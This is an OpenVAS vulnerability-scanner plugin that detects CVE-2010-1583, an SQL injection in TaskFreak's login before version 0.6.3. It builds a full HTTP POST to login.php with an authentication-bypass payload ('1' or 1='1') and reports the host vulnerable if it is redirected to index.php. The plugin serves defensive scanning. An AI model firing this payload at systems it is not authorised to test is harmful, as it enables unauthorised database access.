##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_task_freak_sql_inj_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# Task Freak 'loadByKey()' SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902052");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-05-25 13:56:16 +0200 (Tue, 25 May 2010)");
  script_cve_id("CVE-2010-1583");
  script_bugtraq_id(39793);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Task Freak 'loadByKey()' SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://www.madirish.net/?article=456");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/58241");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/12452");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_task_freak_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TaskFreak/installed");

  script_tag(name:"insight", value:"The flaw exists due to the error in 'loadByKey()', which fails to sufficiently
  sanitize user-supplied data before using it in an SQL query.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Upgrade to the TaskFreak version 0.6.3.");

  script_tag(name:"summary", value:"This host is running Task Freak and is prone SQL Injection
  Vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to view, add, modify or
  delete information in the back-end database.");

  script_tag(name:"affected", value:"TaskFreak version prior to 0.6.3");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

tfPort = get_http_port(default:80);
tfVer = get_kb_item("www/"+ tfPort + "/TaskFreak");
if(!tfVer){
  exit(0);
}

tfVer = eregmatch(pattern:"^(.+) under (/.*)$", string:tfVer);
if(tfVer[2] != NULL)
{

  if(tfVer[2] == "/")
    tfVer[2] = "";

  useragent = http_get_user_agent();
  filename = string(tfVer[2] + "/login.php");
  authVariables ="username=+%221%27+or+1%3D%271%22++";

  host = http_host_name( port:tfPort );

  sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "User-Agent: ", useragent, "\r\n",
                   "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                   "Accept-Language: en-us,en;q=0.5\r\n",
                   "Keep-Alive: 300\r\n",
                   "Connection: keep-alive\r\n",
                   "Referer: http://", host, filename, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_keepalive_send_recv(port:tfPort, data:sndReq);

  if("Location: index.php?" >< rcvRes){
    report = report_vuln_url(port:tfPort, url:filename);
    security_message(port:tfPort, data:report);
  }
}
